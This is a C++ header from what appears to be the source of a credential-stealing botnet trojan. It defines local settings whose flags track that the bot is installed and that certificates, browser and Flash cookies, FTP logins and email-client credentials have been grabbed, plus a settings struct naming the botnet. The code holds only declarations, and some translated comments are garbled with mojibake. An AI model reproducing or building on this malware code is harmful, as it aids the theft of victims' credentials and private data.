/*
  Управление локальными настройками.
  Здесь хранятся настройки к котороым требуется быстрый и частый доступ.
*/
#pragma once

namespace LocalSettings
{
  //SETTINGS:: flags
  enum
  {
    FLAG_BOTNET = 0x1, //A botnet is installed.
  };

  //SETTINGS:: processStartupFlags
  enum
  {
    PSF_CERTSTORE_GRABBED      = 0x01, //Serifikaty received.
    PSF_MFP_GRAB               = 0x02, //Cookies need to get flash player.
    PSF_MFP_REMOVE             = 0x04, //You want to delete cookies flash player.
    PSF_SOFTWARE_FTP_GRABBED   = 0x08, //Logins from the FTP-clients received.
    PSF_COOKIES_GRABBED        = 0x10, //Browser cookies received.
    PSF_USER_DISABLED          = 0x20, //User disconnected.
    PSF_SOFTWARE_EMAIL_GRABBED = 0x40, //E-mails received from customers.
  };
  
# pragma pack(push, 1)  
  typedef struct
  {
    DWORD flags;                        //Flags FLAG_ *.
    WCHAR botnet[BOTNET_MAX_CHARS + 1]; //The name of a botnet.
    DWORD processStartupFlags;          //Flags PSF_ *.
    WORD tcpPortS1;                     //The last port for S1.
    BYTE reserved[64];                  //Reserved for future use.
  }SETTINGS;
# pragma pack(pop)

  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Получение текущих настроек без блокировки.

    OUT settings - буфер для настроек.
  */
  void getCurrent(SETTINGS *settings);
  
  /*
    Получение текущих настроек с блокировкой доступа для других потоков и процессов.

    OUT settings - буфер для настроек.

    Return       - true - настроки прочитаны, доступ заблокирован,
                   false - произошла ошибка.
  */
  bool beginReadWrite(SETTINGS *settings);

  /*В В В В Unlock established beginReadWrite () and save the changes.

В В В В IN OUT settings - settings for the conservation, preservation, or NULL if not required. At the exit
В В В В В В В В В В В В В В В В В В В В В В buffer content is not suitable for use.
В В В В 
В В В В Return - true - settings successfully saved,
В В В В В В В В В В В В В В В В В В В В В В false - the settings are not saved.
В В */
  bool endReadWrite(SETTINGS *settings);
};
